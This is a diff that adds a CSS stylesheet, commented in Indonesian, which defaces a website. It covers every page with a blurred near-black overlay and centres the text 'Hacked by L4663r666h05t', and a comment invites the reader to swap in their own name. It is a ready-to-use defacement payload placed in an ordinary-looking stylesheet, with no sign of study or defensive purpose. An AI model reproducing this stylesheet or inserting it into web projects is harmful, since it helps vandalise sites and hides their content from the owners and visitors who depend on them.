@@ -1,0 +1,40 @@
+/* ===== Overlay + Center Text ===== */
+
+/* Overlay hitam transparan */
+body::after {
+  content: "";
+  position: fixed;
+  inset: 0;
+  animation: noiseMove 0.5s steps(2) infinite;
+  z-index: 99998;
+  pointer-events: none;
+  background-color: rgba(0, 0, 0, 0.8); /* hitam transparan */
+  backdrop-filter: blur(15px);
+}
+
+/* Teks tengah putih */
+body::before {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  content: "Hacked by L4663r666h05t"; /* ubah teks di sini */
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  font-family: monospace;
+  font-size: 4vw;
+  font-weight: bold;
+  color: white; /* putih polos */
+  animation: none; /* tanpa glitch warna */
+  z-index: 99999;
+  pointer-events: none;
+  width: 100dvw;
+  height: 100dvh;
+}
+
+/* Tetap pertahankan animasi noise background */
+@keyframes noiseMove {
+  0%, 100% { background-position: 0 0, 0 0; }
+  50% { background-position: 5px 5px, -5px -5px; }
+}
